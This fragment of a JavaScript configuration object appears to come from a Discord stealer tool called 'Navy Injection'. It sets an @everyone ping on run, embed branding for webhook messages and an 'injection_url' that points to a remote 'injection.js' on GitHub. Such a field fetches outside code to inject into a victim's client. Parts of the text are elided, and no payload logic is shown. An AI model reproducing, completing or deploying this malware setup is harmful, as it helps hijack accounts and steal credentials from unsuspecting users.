...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Navy Injection', 
  embed_icon: 'https://i.imgur.com/BrtbxvH.png'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
    injection_url: 'https://raw.githubusercontent.com/MyPrincessAkira/Jarvas/main/injection.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
            text: '・Navy Injection・',
            icon_url: "https://i.imgur.com/BrtbxvH.png"
        },
      },
    ],
  };
